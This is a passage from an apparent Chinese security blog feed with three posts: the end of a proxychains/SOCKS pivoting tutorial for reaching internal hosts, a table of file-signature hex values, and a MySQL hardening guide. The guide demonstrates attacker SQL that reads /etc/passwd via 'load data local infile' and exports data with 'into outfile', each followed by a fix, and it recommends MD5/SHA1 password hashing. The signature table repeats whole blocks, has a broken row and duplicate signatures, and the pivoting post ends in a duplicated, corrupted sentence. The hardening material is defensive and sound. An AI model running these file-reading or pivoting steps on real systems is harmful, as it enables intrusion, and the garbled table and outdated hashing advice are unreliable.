</code></pre><h3 id="编译和安装"><a href="#编译和安装" class="headerlink" title="编译和安装"></a>编译和安装</h3><pre><code class="bash">cd proxychains
./configure
make &amp;&amp; make install
</code></pre><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>使用前需要对 proxychains 进行简单配置，打开配置文件 <code>/etc/proxychains.conf</code></p><p>在 <code>[ProxyList]</code> 处添加</p><pre><code class="bash">socks5 127.0.0.1 1088
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/socks-proxy-4.png" alt="Socks 代理"> 配置成功后若要启动程序，仅需要在启动程序命令前加上 <code>proxychains</code></p><h2 id="启用浏览器-firefox"><a href="#启用浏览器-firefox" class="headerlink" title="启用浏览器 firefox"></a>启用浏览器 firefox</h2><p>机子：<code>kali Liunx</code>；IP: <code>192.168.199.130</code></p><pre><code class="bash">proxychains firefox
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/socks-proxy-5.png" alt="Socks 代理"></p><h2 id="访问内网机子"><a href="#访问内网机子" class="headerlink" title="访问内网机子"></a>访问内网机子</h2><p>机子：<code>kali Liunx</code>；IP: <code>192.168.235.143</code></p><blockquote><p>注意：现在已经可以直接访问内网主机了，IP：<code>192.168.235.142</code></p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/socks-proxy-6.png" alt="Socks 代理"></p><p>随便点个链接，然后再看一眼 <code>ubuntu-server</code> 中的日志，成功访问到内网中的页面<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/socks-proxy-7.png" alt="Socks 代理"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>由于系统管理员的疏忽或者业务需求所致，防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此，在此种情况下，通过攻陷映射到公网的端口服务，利用反弹便可获取内网访问权限，给内网安全带来极大的威胁。在信息安全建设与运维过程中，不仅要加强映射到公网的服务安全，也要重视由内到外连接的安全威胁 �维过程中，不仅要加强映射到公网的服务安全，也要重视由内到外连接的安全威胁</p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> networking </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Pentest </tag>
            
            <tag> Network </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[常见的文件头和文件尾]]></title>
      <url>/2016/11/file-header-and-tail/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>文件头是位于文件开头的一段承担一定任务的数据，一般都在开头的部分。而文件尾对应的就在 文件的结束部分，本篇将介绍常见的文件头和文件尾的十六进制数，这些文件的文件头和文件尾几乎多是一样的<a id="more"></a></p><h1 id="从-Ultraedit-提取的文件头信息"><a href="#从-Ultraedit-提取的文件头信息" class="headerlink" title="从 Ultraedit 提取的文件头信息"></a>从 Ultraedit 提取的文件头信息</h1><table><thead><tr><th>文件类型</th><th>文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>JPEG (<code>jpg</code>)</td><td>FF D8 FF</td><td>FF D9</td></tr><tr><td>PNG (<code>png</code>)</td><td>89 50 4E 47</td><td>AE 42 60 82</td></tr><tr><td>GIF (<code>gif</code>)</td><td>47 49 46 38</td><td>00 3B</td></tr><tr><td>TIFF (<code>tif</code>)</td><td>49 49 2A 00</td><td></td></tr><tr><td>Windows Bitmap (<code>bmp</code>)</td><td>42 4D</td><td></td></tr><tr><td>ZIP Archive (<code>zip</code>)</td><td>50 4B 03 04</td><td>50 4B</td></tr><tr><td>RAR Archive (<code>rar</code>)</td><td>52 61 72 21</td><td>07 00</td></tr><tr><td>CAD (<code>dwg</code>)</td><td>41 43 31 30</td><td></td></tr><tr><td>Adobe Photoshop (<code>psd</code>)</td><td>38 42 50 53</td><td></td></tr><tr><td>Rich Text Format (<code>rtf</code>)</td><td>7B 5C 72 74 66</td><td></td></tr><tr><td>XML (<code>xml</code>)</td><td>3C 3F 78 6D 6C</td><td></td></tr><tr><td>HTML (<code>html</code>)</td><td>3C 68 74 6D 6C</td><td>3C 2F 68 74 6D 6C 3E</td></tr><tr><td>Email thorough only (<code>eml</code>)</td><td>44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</td><td></td></tr><tr><td>Outlook Express (<code>dbx</code>)</td><td>CF AD 12 FE C5 FD 74 6F</td><td></td></tr><tr><td>Outlook (<code>pst</code>)</td><td>21 42 44 4E</td><td></td></tr><tr><td>MS Word/Excel (<code>xls</code> or <code>doc</code>)</td><td>D0 CF 11 E0</td><td></td></tr><tr><td>MS Access (<code>mdb</code>)</td><td>53 74 61 6E 64 61 72 64 20 4A</td><td></td></tr><tr><td>WordPerfect (<code>wpd</code>)</td><td>FF 57 50 43</td><td></td></tr><tr><td>Postscript (<code>eps</code> or <code>ps</code>)</td><td>25 21 50 53 2D 41 64 6F 62 65</td><td></td></tr><tr><td>Adobe Acrobat (<code>pdf</code>)</td><td>25 50 44 46 2D 31 2E</td><td></td></tr><tr><td>Quicken (<code>qdf</code>)</td><td>AC 9E BD 8F</td><td></td></tr><tr><td>Windows Password (<code>pwl</code>)</td><td>AC 9E BD 8F</td><td></td></tr><tr><td>Wave (<code>wav</code>)</td><td>57 41 56 45</td><td></td></tr><tr><td>AVI (<code>avi</code>)</td><td>41 56 49 20</td><td></td></tr><tr><td>AVI (<code>avi</code>)</td><td>41 56 49 20</td><td></td></tr><tr><td>Real Audio (<code>ram</code>)</td><td>2E 72 61 FD</td><td></td></tr><tr><td>Real Media (<code>rm</code>)</td><td>2E 52 4D 46</td><td></td></tr><tr><td>MPEG (<code>mpg</code>)</td><td>00 00 01 BA</td><td></td></tr><tr><td>MPEG (<code>mpg</code>)</td><td>00 00 01 B3</td><td></td></tr><tr><td>Quicktime (<code>mov</code>)</td><td>6D 6F 6F 76</td><td></td></tr><tr><td>Windows Media (<code>asf</code>)</td><td>30 26 B2 75 8E 66 CF 11</td><td></td></tr><tr><td>MIDI (<code>mid</code>)</td><td>4D 54 68 64</td></tr></tbody></table><h1 id="从-winhex-提取的文件头信息"><a href="#从-winhex-提取的文件头信息" class="headerlink" title="从 winhex 提取的文件头信息"></a>从 winhex 提取的文件头信息</h1><table><thead><tr><th>文件</th><th>文件后缀</th><th>文件头</th></tr></thead><tbody><tr><td>JPEG</td><td><code>jpg</code>;<code>jpeg</code></td><td>0xFFD8FF</td></tr><tr><td>PNG</td><td><code>png</code></td><td>0x89504E470D0A1A0A</td></tr><tr><td>GIF</td><td><code>gif</code></td><td>GIF8</td></tr><tr><td>TIFF</td><td><code>tif</code>;<code>tiff</code></td><td>0x49492A00</td></tr><tr><td>Bit map</td><td><code>bmp</code></td><td>BM</td></tr><tr><td>AOL ART</td><td><code>art</code></td><td>0x4A47040E000000</td></tr><tr><td>PC Paintbrush</td><td><code>pcx</code></td><td>0x0A050108</td></tr><tr><td>Graphics Metafile</td><td><code>wmf</code></td><td>0xD7CDC69A</td></tr><tr><td>Enhanced Metafile</td><td><code>emf</code></td><td>0x0100000058000000</td></tr><tr><td>Corel Draw</td><td><code>cdr</code></td><td>CDR</td></tr><tr><td>CAD</td><td><code>dwg</code></td><td>0x41433130</td></tr><tr><td>Adobe Photoshop</td><td><code>psd</code></td><td>8BPS</td></tr><tr><td>Rich Text Format</td><td><code>rtf</code></td><td>rtf</td></tr><tr><td>XML</td><td><code>xml</code></td><td></td></tr><tr><td>HTML</td><td><code>html</code>;<code>htm</code>;<code>php</code></td><td>type</td></tr><tr><td>Email</td><td><code>eml</code></td><td>Delivery-date:</td></tr><tr><td>Outlook Express</td><td><code>dbx</code></td><td>0xCFAD12FE</td></tr><tr><td>MS Office/OLE2</td><td><code>doc</code>;<code>xls</code>;<code>dot</code>;<code>ppt</code>;<code>db</code></td><td>0xD0CF11E0A1B11AE1</td></tr><tr><td>MS Access</td><td><code>mdb</code>;<code>mda</code>;<code>mde</code>;<code>mdt</code></td><td>Standard J</td></tr><tr><td>WordPerfect</td><td><code>wpd</code></td><td>0xFF575043</td></tr><tr><td>OpenOffice Writer</td><td><code>sxw</code></td><td>writer</td></tr><tr><td>OpenOffice Calc</td><td><code>sxc</code></td><td>calc</td></tr><tr><td>WordPerfect</td><td><code>wpd</code></td><td>0xFF575043</td></tr><tr><td>OpenOffice Writer</td><td><code>sxw</code></td><td>writer</td></tr><tr><td>OpenOffice Calc</td><td><code>sxc</code></td><td>calc</td></tr><tr><td>OpenOffice Math</td><td><code>sxm</code></td><td>math</td></tr><tr><td>Windows Password</td><td><code>pwl</code></td><td>0xE3828596</td></tr><tr><td>ZIP Archive</td><td><code>zip</code>;<code>jar</code></td><td>0x504B0304</td></tr><tr><td>ZIP Archive (outdated)</td><td><code>zip</code></td><td>0x504B3030</td></tr><tr><td>RAR Archive</td><td><code>rar</code></td><td>Rar!</td></tr><tr><td>GZ Archive</td><td><code>gz</code>;<code>tgz</code></td><td>0x1F8B08</td></tr><tr><td>BZIP Archive</td><td><code>bz2</code></td><td>BZh</td></tr><tr><td>ARJ Archive</td><td><code>arj</code></td><td>0x60EA</td></tr><tr><td>7－ZIP Archive</td><td><code>7z</code></td><td>7z集’</td></tr><tr><td>Wave</td><td><code>wav</code></td><td>WAVE</td></tr><tr><td>AVI</td><td><code>avi</code></td><td>AVI</td></tr><tr><td>Real Audio</td><td><code>ram</code>;<code>ra</code></td><td>.ra?0</td></tr><tr><td>Real Media</td><td><code>rm</code></td><td>.RMF</td></tr><tr><td>MPEG</td><td><code>mpg</code>;<code>mpeg</code></td><td>0x000001BA</td></tr><tr><td>MPEG</td><td><code>mpg</code>;<code>mpeg</code></td><td>0x000001B3</td></tr><tr><td>F575043</td><td></td><td></td></tr><tr><td>OpenOffice Writer</td><td><code>sxw</code></td><td>writer</td></tr><tr><td>OpenOffice Calc</td><td><code>sxc</code></td><td>calc</td></tr><tr><td>OpenOffice Math</td><td><code>sxm</code></td><td>math</td></tr><tr><td>Windows Password</td><td><code>pwl</code></td><td>0xE3828596</td></tr><tr><td>ZIP Archive</td><td><code>zip</code>;<code>jar</code></td><td>0x504B0304</td></tr><tr><td>ZIP Archive (outdated)</td><td><code>zip</code></td><td>0x504B3030</td></tr><tr><td>RAR Archive</td><td><code>rar</code></td><td>Rar!</td></tr><tr><td>GZ Archive</td><td><code>gz</code>;<code>tgz</code></td><td>0x1F8B08</td></tr><tr><td>BZIP Archive</td><td><code>bz2</code></td><td>BZh</td></tr><tr><td>ARJ Archive</td><td><code>arj</code></td><td>0x60EA</td></tr><tr><td>7－ZIP Archive</td><td><code>7z</code></td><td>7z集’</td></tr><tr><td>Wave</td><td><code>wav</code></td><td>WAVE</td></tr><tr><td>AVI</td><td><code>avi</code></td><td>AVI</td></tr><tr><td>Real Audio</td><td><code>ram</code>;<code>ra</code></td><td>.ra?0</td></tr><tr><td>Real Media</td><td><code>rm</code></td><td>.RMF</td></tr><tr><td>MPEG</td><td><code>mpg</code>;<code>mpeg</code></td><td>0x000001BA</td></tr><tr><td>MPEG</td><td><code>mpg</code>;<code>mpeg</code></td><td>0x000001B3</td></tr><tr><td>F575043</td><td></td><td></td></tr><tr><td>OpenOffice Writer</td><td><code>sxw</code></td><td>writer</td></tr><tr><td>OpenOffice Calc</td><td><code>sxc</code></td><td>calc</td></tr><tr><td>OpenOffice Math</td><td><code>sxm</code></td><td>math</td></tr><tr><td>Windows Password</td><td><code>pwl</code></td><td>0xE3828596</td></tr><tr><td>ZIP Archive</td><td><code>zip</code>;<code>jar</code></td><td>0x504B0304</td></tr><tr><td>ZIP Archive (outdated)</td><td><code>zip</code></td><td>0x504B3030</td></tr><tr><td>RAR Archive</td><td><code>rar</code></td><td>Rar!</td></tr><tr><td>GZ Archive</td><td><code>gz</code>;<code>tgz</code></td><td>0x1F8B08</td></tr><tr><td>BZIP Archive</td><td><code>bz2</code></td><td>BZh</td></tr><tr><td>ARJ Archive</td><td><code>arj</code></td><td>0x60EA</td></tr><tr><td>7－ZIP Archive</td><td><code>7z</code></td><td>7z集’</td></tr><tr><td>Wave</td><td><code>wav</code></td><td>WAVE</td></tr><tr><td>AVI</td><td><code>avi</code></td><td>AVI</td></tr><tr><td>Real Audio</td><td><code>ram</code>;<code>ra</code></td><td>.ra?0</td></tr><tr><td>Real Media</td><td><code>rm</code></td><td>.RMF</td></tr><tr><td>MPEG</td><td><code>mpg</code>;<code>mpeg</code></td><td>0x000001BA</td></tr><tr><td>MPEG</td><td><code>mpg</code>;<code>mpeg</code></td><td>0x000001B3</td></tr></tbody></table><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Pentest </tag>
            
            <tag> Windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL 数据库安全加固]]></title>
      <url>/2016/10/mysql-database-user-policy/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>数据库作为数据管理的平台，它的安全性首先由系统内部和网络安全两部分来决定的。对于系统管理员来说，首先要保证系统本身的安全，在安装 MySQL 数据时，需要对基础环境进行较好的配置。本篇笔记将记录在 RedHat Liunx 系统下 MySQL 数据库的安全加固方法<a id="more"></a></p><h1 id="修改-root-用户口令"><a href="#修改-root-用户口令" class="headerlink" title="修改 root 用户口令"></a>修改 root 用户口令</h1><p>缺省安装的 MySQL 的 root 用户是空密码的，为了安全起见，必须修改为强密码，所谓的强密码，至少 8位，由字母、数字和符号组成的不规律密码。使用 MySQL 自带的命令 <code>mysqladmin</code> 修改 root 密码，同时也可以登陆数据库，修改数据库 mysql 下的 user 表的字段内容</p><h2 id="使用-mysqladmin-命令"><a href="#使用-mysqladmin-命令" class="headerlink" title="使用 mysqladmin 命令"></a>使用 mysqladmin 命令</h2><p>修改密码，<code>For Example:</code></p><pre><code class="bash">mysqladmin -u root password &quot;upassword&quot;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-1.png" alt="MySQL 数据库加固"></p><h2 id="使用-SQL-语句修改"><a href="#使用-SQL-语句修改" class="headerlink" title="使用 SQL 语句修改"></a>使用 SQL 语句修改</h2><p><code>Connection Example:</code></p><pre><code class="bash">mysql -h 127.0.0.1 -u root -p
</code></pre><blockquote><p>输入之前设置的密码 <code>upassword</code>，连接数据库</p></blockquote><p>修改密码，<code>For Example:</code></p><pre><code class="sql">mysql&gt; use mysql;           -- 切换当前的数据库
mysql&gt; update mysql.user set password=password(&#39;upassword&#39;) where user=&#39;root&#39;;
mysql&gt; flush privileges;    -- 强制刷新内存授权表，否则用的还是内存缓存中的口令。
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-2.png" alt="MySQL 数据库加固"></p><p>修改完成之后可以执行 SQL 语句查询，<code>For Example:</code></p><pre><code class="sql">mysql&gt; select * from mysql.user;
</code></pre><h1 id="删除默认数据库和数据库用户"><a href="#删除默认数据库和数据库用户" class="headerlink" title="删除默认数据库和数据库用户"></a>删除默认数据库和数据库用户</h1><p>一般情况下，MySQL 数据库安装在本地，并且也只需要本地的 php 脚本对 mysql 进行读取，所以很多用户不需要，尤其是默认安装的用户。MySQL 初始化后会自动生成空用户和 test 库，进行安装的测试，这会对数据库的安全构成威胁，有必要全部删除，最后的状态只保留单个 root 即可，当然以后根据需要增加用户和数据库。</p><p>执行以下 SQL 语句，<code>For Example:</code></p><pre><code class="sql">mysql&gt; show databases;      -- 显示当前的所有数据库
mysql&gt; drop database test;  -- 删除数据库 test
mysql&gt; use mysql;
mysql&gt; delete from db;      -- 删除存放在数据库的表信息，因为还没有数据库信息
mysql&gt; delete from mysql.user where not (user=&#39;root&#39;);
mysql&gt; delete from mysql.user where user=&#39;root&#39; and password=&#39;&#39;;
mysql&gt; flush privileges;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-3.png" alt="MySQL 数据库加固"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-4.png" alt="MySQL 数据库加固"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-5.png" alt="MySQL 数据库加固"></p><h1 id="改变默认-MySQL-管理员账号"><a href="#改变默认-MySQL-管理员账号" class="headerlink" title="改变默认 MySQL 管理员账号"></a>改变默认 MySQL 管理员账号</h1><p>系统 MySQL 的管理员名称是 root，而一般情况下，数据库管理员都没进行修改，这一定程度上对系统用户穷举的恶意行为提供了便利，此时修改为复杂的用户名，请不要在设定为 admin 或者 administraror 的形式，因为它们也在易猜的用户字典中。</p><pre><code class="sql">mysql&gt; update mysql.user set user=&quot;newroot&quot; where user=&quot;root&quot;;
mysql&gt; flush privileges;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-6.png" alt="MySQL 数据库加固"></p><h1 id="关于密码的管理"><a href="#关于密码的管理" class="headerlink" title="关于密码的管理"></a>关于密码的管理</h1><p>密码是数据库安全管理的一个很重要因素，不要将纯文本密码保存到数据库中。如果你的计算机有安全危险，入侵者可以获得所有的密码并使用它们。相反，应使用 <code>MD5()</code>、<code>SHA1()</code> 或单向哈希函数。也不要从词典中选择密码，有专门的程序可以破解它们，请选用至少八位，由字母、数字和符号组成的强密码。在存取密码时，使用 mysql 的内置函数 <code>password（）</code> 的sql语句，对密码进行加密后存储。例如以下方式在users表中加入新用户。</p><pre><code class="sql">mysql&gt; insert into users values (1,password(1234),&#39;test&#39;);
</code></pre><h1 id="使用独立用户运行-MySQL"><a href="#使用独立用户运行-MySQL" class="headerlink" title="使用独立用户运行 MySQL"></a>使用独立用户运行 MySQL</h1><p>绝对不要作为使用 root 用户运行 <code>MySQL 服务器</code>。这样做非常危险，因为任何具有 FILE 权限的用户能够用 root 创建文件(例如：<code>~root/.bashrc</code>)。mysqld 拒绝使用 root 运行，除非使用 <code>–user=root</code> 选项明显指定。应该用普通非特权用户运行 mysqld。</p><p>要想用其它 Unix 用户启动 mysqld，，增加 user 选项指定 <code>/etc/my.cnf</code> 选项文件或服务器数据目录的 <code>my.cnf</code> 选项文件中的 <code>[mysqld]</code> 组的用户名。</p><h2 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h2><p><code>/etc/my.cnf</code> 配置文件</p><pre><code class="bash">[mysqld]
user=mysql
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-7.png" alt="MySQL 数据库加固"></p><p>该命令使服务器用指定的用户来启动，无论你手动启动或通过 <code>mysqld_safe</code> 或 <code>mysql.server</code> 启动，都能确保使用mysql的身份。也可以在启动数据库是，加上 <code>user</code> 参数。</p><pre><code class="bash">/usr/bin/mysqld_safe --user=mysql
</code></pre><p>作为其它 linux 用户而不用 root 运行 mysqld，你不需要更改 user 表中的 root 用户名，因为 <code>MySQL 账户</code>的用户名与 <code>linux 账户</code>的用户名无关。确保 mysqld 运行时，只使用对数据库目录具有读或写权限的linux用户来运行。</p><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-8.png" alt="MySQL 数据库加固"></p><h1 id="禁止远程连接数据库"><a href="#禁止远程连接数据库" class="headerlink" title="禁止远程连接数据库"></a>禁止远程连接数据库</h1><p>在命令行 <code>netstat -ant</code> 下看到，默认的 <code>3306</code> 端口是打开的，此时打开了 <code>mysqld</code> 的网络监听，允许用户远程通过帐号密码连接数本地据库，默认情况是允许远程连接数据的。为了禁止该功能，启动 <code>skip-networking</code>，不监听 sql 的任何 <code>TCP/IP</code> 的连接，切断远程访问的权利，保证安全性。假如需要远程管理数据库，可通过安装 <code>PhpMyadmin</code> 来实现。假如确实需要远程连接数据库，至少修改默认的监听端口，同时添加防火墙规则，只允许可信任的网络的 <code>mysql</code> 监听端口的数据通过。</p><h2 id="加固-1"><a href="#加固-1" class="headerlink" title="加固"></a>加固</h2><p>编辑 <code>/etc/my.cnf</code>，加入如下语句</p><pre><code class="bash">[mysqld]
skip-networking
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-9.png" alt="MySQL 数据库加固"></p><p>执行重启语句，<code>For Example:</code></p><pre><code class="bash">service mysqld restart
</code></pre><h1 id="限制连接用户的数量"><a href="#限制连接用户的数量" class="headerlink" title="限制连接用户的数量"></a>限制连接用户的数量</h1><p>数据库的某用户多次远程连接，会导致性能的下降和影响其他用户的操作，有必要对其进行限制。可以通过限制单个账户允许的连接数量来实现，设置 <code>my.cnf</code> 文件的 <code>mysqld</code> 中的 <code>max_user_connections</code> 变量来完成。<code>GRANT</code> 语句也可以支持 资源控制选项来限制服务器对一个账户允许的使用范围。</p><p>编辑 <code>/etc/my.cnf</code>，加入如下语句</p><pre><code class="bash">[mysqld]
max_user_connections 2
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-10.png" alt="MySQL 数据库加固"></p><h1 id="用户目录权限限制"><a href="#用户目录权限限制" class="headerlink" title="用户目录权限限制"></a>用户目录权限限制</h1><p>默认的 MySQL 是安装在 <code>/usr/share/mysql</code>，而对应的数据库文件在 <code>/var/lib/mysql</code> 目录下，因此，必须保证该目录不能让未经授权的用户访问后把数据库打包拷贝走了，所以要限制对该目录的访问。确保 <code>mysqld</code> 运行时，只使用对数据库目录具有读或写权限的 linux 用户来运行。</p><p>修改权限，<code>For Example:</code></p><pre><code class="bash">chown -R root /usr/share/mysql
chown -R mysql:mysql /var/lib/mysql
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-11.png" alt="MySQL 数据库加固"></p><h1 id="命令历史记录保护"><a href="#命令历史记录保护" class="headerlink" title="命令历史记录保护"></a>命令历史记录保护</h1><p>数据库相关的 shell 操作命令都会分别记录在 <code>.bash_history</code>，如果这些文件不慎被读取，会导致数据库密码和数据库结构等信息泄露，而登陆数据库后的操作将记录在 <code>/etc/my.cnf</code> 文件配置的文件中，如果使用 <code>update</code> 表信息来修改数据库用户密码的话，也会被读取密码，因此需要删除这两个文件，同时在进行登陆或备份数据库等与密码相关操作时，应该使用 <code>-p</code> 参数加入提示输入密码后，隐式输入密码，建议将以上文件置空。</p><h2 id="加固-2"><a href="#加固-2" class="headerlink" title="加固"></a>加固</h2><p>配置文件 <code>/etc/my.cnf</code> 中配置数据库操作日志存放路径，<code>For Example:</code></p><pre><code class="bash">[mysqld_safe]
log=~/.mysql_history
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-12.png" alt="MySQL 数据库加固"></p><p>随意执行一些操作，<code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-13.png" alt="MySQL 数据库加固"></p><p>查看 <code>~/.mysql_history</code> 文件，可以看到数据库操作纪录（将会纪录所有成功或者失败的操作 SQL 语句）<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-14.png" alt="MySQL 数据库加固"></p><p>查看 <code>~/.bash_history</code> 文件，可以看到有关于数据操作的 shell 命令<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-15.png" alt="MySQL 数据库加固"></p><p>删除操作命令，<code>For Example:</code></p><pre><code class="bash">rm .bash_history .mysql_history
ln -s /dev/null .bash_history
ln -s /dev/null .mysql_history
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-16.png" alt="MySQL 数据库加固"></p><h1 id="禁止-MySQL-对本地文件存取"><a href="#禁止-MySQL-对本地文件存取" class="headerlink" title="禁止 MySQL 对本地文件存取"></a>禁止 MySQL 对本地文件存取</h1><p>在 mysql 中，提供对本地文件的读取，使用的是 <code>load data local infile</code> 命令，默认在5.0版本中，该选项是默认打开的，该操作令会利用MySQL把本地文件读到数据库中，然后用户就可以非法获取敏感信息了，假如你不需要读取本地文件，请务必关闭。</p><h2 id="测试存取"><a href="#测试存取" class="headerlink" title="测试存取"></a>测试存取</h2><p>测试：首先在测试数据库下建立 <code>sqlfile.txt</code> 文件，用逗号隔开各个字段<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-19.png" alt="MySQL 数据库加固"></p><p>在测试数据库，先新建一张表，建表的 SQL 语句如下，<code>For Example:</code></p><pre><code class="sql">create table users (
  userid int(11),
  username varchar(255),
  password int(11)
);
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-17.png" alt="MySQL 数据库加固"></p><p>执行导入语句，<code>For Example:</code></p><pre><code class="sql">mysql&gt; load data local infile &#39;sqlfile.txt&#39; into table test.users fields terminated by &#39;,&#39;;
mysql&gt; select * from test.users;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-18.png" alt="MySQL 数据库加固"></p><p>成功的将本地数据插入数据中，此时应该禁止 MySQL 中用 <code>load data local infile</code> 命令。网络上流传的一些攻击方法中就有用它 <code>load data local infile</code> 的，同时它也是很多新发现的 <code>SQL Injection</code> 攻击利用的手段！黑客还能通过使用 <code>load data local infile</code> 装载 <code>/etc/passwd</code> 进一个数据库表，然后能用 <code>SELECT</code> 显示它，这个操作对服务器的安全来说，是致命的。可以在 <code>/etc/my.cnf</code> 中添加 <code>local-infile=0</code>，或者加参数 <code>local-infile=0</code> 启动 <code>mysql</code>。</p><h2 id="SQL-攻击"><a href="#SQL-攻击" class="headerlink" title="SQL 攻击"></a>SQL 攻击</h2><p>黑客使用 <code>load data local infile</code> 获取 <code>/etc/passwd</code> 文件内容步骤<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-20.png" alt="MySQL 数据库加固"></p><p>接下来黑客只需执行 <code>select * from test.passwd</code> 就可以查询到数据了。</p><h3 id="加固-3"><a href="#加固-3" class="headerlink" title="加固"></a>加固</h3><p>编辑 <code>/etc/my.cnf</code> 文件，加入如下语句，<code>For Example:</code></p><pre><code class="bash">[mysqld]
local-infile=0
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-21.png" alt="MySQL 数据库加固"></p><p>或者直接执行命令，<code>For Example:</code></p><pre><code class="bash">mysql_safe --user=mysql --local-infile=0
</code></pre><p>再次执行 <code>load data local infile</code> 命令，导入 <code>/etc/passwd</code> 内容，发现命令出错</p><pre><code class="sql">mysql&gt; load data local infile &#39;/etc/passwd&#39; into table test.passwd fields terminated by &#39;:&#39;;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-22.png" alt="MySQL 数据库加固"></p><h1 id="MySQL-服务器权限控制"><a href="#MySQL-服务器权限控制" class="headerlink" title="MySQL 服务器权限控制"></a>MySQL 服务器权限控制</h1><p>MySQL 权限系统的主要功能是证实连接到一台给定主机的用户，并且赋予该用户在数据库上的 <code>SELECT</code>、<code>INSERT</code>、<code>UPDATE</code> 和 <code>DELETE</code> 等权限（详见 user 超级用户表）。它的附加的功能包括有匿名的用户并对于 MySQL 特定的功能例如 <code>load data local infile</code> 进行授权及管理操作的能力。</p><p>FILE 权限允许用户在 MySQL 服务器具有写权限的目录下创建新文件，但不能覆盖已有文件在 user 表的 <code>File_priv</code> 设置 <code>Y</code> 或 <code>N</code>。，所以当你不需要对服务器文件读取时，请关闭该权限。</p><h2 id="加固-4"><a href="#加固-4" class="headerlink" title="加固"></a>加固</h2><blockquote><p>需要将之前的加固配置项（<code>local-infile=0</code>）清掉</p></blockquote><pre><code class="sql">mysql&gt; update mysql.user set file_priv=&#39;N&#39; where user=&#39;root&#39;;
mysql&gt; flush privileges;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-23.png" alt="MySQL 数据库加固"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-24.png" alt="MySQL 数据库加固"></p><blockquote><p>注意：刷新授权表之后，一定要重新登录再进行测试，否则还是会执行成功的</p></blockquote><p>当 <code>file_priv=&#39;N&#39;</code>，黑客进行以下语句的时候，就会出错</p><pre><code class="sql">mysql&gt; select * from test.passwd into outfile &#39;test.txt&#39; fields terminated by &#39;:&#39;;
</code></pre><p>当然还原配置之后，黑客就可以很愉快的获取数据库中内容</p><p><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-25.png" alt="MySQL 数据库加固"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/mysql-reinforce-26.png" alt="MySQL 数据库加固"></p><h1 id="使用-chroot-来控制-MySQL-的运行目录"><a href="#使用-chroot-来控制-MySQL-的运行目录" class="headerlink" title="使用 chroot 来控制 MySQL 的运行目录"></a>使用 chroot 来控制 MySQL 的运行目录</h1><p><code>Chroot</code> 是 linux 中的一种系统高级保护手段，它的建立会将其与主系统几乎完全隔离，也就是说，一旦遭到什么问题，也不会危及到正在运行的主系统。这是一个非常有效的办法，特别是在配置网络服务程序的时候。</p><h1 id="关闭对Web访问的支持"><a href="#关闭对Web访问的支持" class="headerlink" title="关闭对Web访问的支持"></a>关闭对Web访问的支持</h1><p>如果不打算让 Web 访问使用 MySQL 数据库，没有提供诸如 PHP 这样的 Web 语言的时候，重新设置或编译你的 PHP，取消它们对 MySQL 的默认支持。假如服务器中使用 PHP 等 web 程序，试试用 Web 形式非法的请求，如果得到任何形式的 MySQL 错误，立即分析原因，及时修改 Web 程序，堵住漏洞，防止 MySQL 暴露在 web 面前。 对于 Web 的安全检查，在 MySQL 官方文档中这么建议，对于 web 应用，至少检查以下清单：</p><ul><li>试试用 Web 形式输入单引号和双引号(<code>‘’’</code> 和 <code>‘”’</code>)。如果得到任何形式的MySQL错误，立即分析原因。</li><li>试试修改动态 URL，可以在其中添加 <code>%22(‘”’)</code>、<code>%23(‘#’)</code> 和 